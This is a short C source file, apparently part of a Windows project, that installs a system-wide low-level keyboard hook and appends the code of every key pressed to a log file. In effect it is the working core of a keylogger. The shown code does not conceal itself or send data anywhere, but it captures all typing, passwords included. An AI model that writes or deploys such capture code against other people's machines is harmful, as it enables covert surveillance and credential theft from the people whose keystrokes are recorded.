#include <windows.h>
#include "hook.h"
#include "config.h"

HHOOK hHook = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            DWORD vkCode = p->vkCode;

            // append mode
            FILE *file = fopen(LOG_FILE_PATH, "a");
            if (file)
            {
                fprintf(file, "Key pressed: %lu\n", vkCode);
                fclose(file);
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL installHook()
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    return hHook != NULL;
}

void uninstallHook()
{
    if (hHook != NULL)
    {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}